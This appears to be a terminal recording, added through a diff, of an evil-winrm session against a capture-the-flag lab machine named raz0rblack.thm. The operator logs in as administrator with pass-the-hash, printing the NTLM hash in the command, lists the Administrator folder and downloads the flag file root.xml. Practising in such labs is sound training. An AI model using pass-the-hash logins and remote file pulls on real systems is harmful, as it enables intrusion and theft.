@@ -1,0 +1,53 @@
+Script started on 2025-04-08 17:24:49+03:00 [COMMAND="evil-winrm -i raz0rblack.thm -u administrator -H 9689931bed40ca5a2ce1218210177f0c" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="104" LINES="27"]
+                                        
+[0;34mEvil-WinRM shell v3.7[0m
+                                        
+[0;1;33mWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine[0m
+                                        
+[0;35mData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion[0m
+                                        
+[0;34mInfo: Establishing connection to remote endpoint[0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> cd ..
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator> dir
+
+
+    Directory: C:\Users\Administrator
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/21/2021   9:45 AM                3D Objects
+d-r---        5/21/2021   9:45 AM                Contacts
+d-r---        5/21/2021   9:45 AM                Desktop
+d-r---        5/21/2021   9:45 AM                Documents
+d-r---        5/21/2021   9:45 AM                Downloads
+d-r---        5/21/2021   9:45 AM                Favorites
+d-r---        5/21/2021   9:45 AM                Links
+d-r---        5/21/2021   9:45 AM                Music
+d-r---        5/21/2021   9:45 AM                Pictures
+d-r---        5/21/2021   9:45 AM                Saved Games
+d-r---        5/21/2021   9:45 AM                Searches
+d-r---        5/21/2021   9:45 AM                Videos
+-a----        2/25/2021   1:08 PM            290 cookie.json
+-a----        2/25/2021   1:12 PM           2512 root.xml
+
+
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator> mv[42G[K[41G[Kget root.xml
+The term 'get' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ get root.xml
++ ~~~
+    + CategoryInfo          : ObjectNotFound: (get:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator> download root.xml
+                                        
+[0;34mInfo: Downloading C:\Users\Administrator\root.xml to root.xml[0m
+Progress: 100% : |▓▓▓▓▓▓▓▓▓▒|                                                  
+[0;34mInfo: Download successful![0m
+[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator> bat [44G[43G[K[42G[K[41G[Kcd C[44G[K[43G[42G[Kd ..
+^C                                        
+[0;31mError: An error of type Interrupt happened, message is [0m
+                                        
+[0;31mError: Exiting with code 1[0m
+^C
+Script done on 2025-04-08 17:33:03+03:00 [COMMAND_EXIT_CODE="130"]
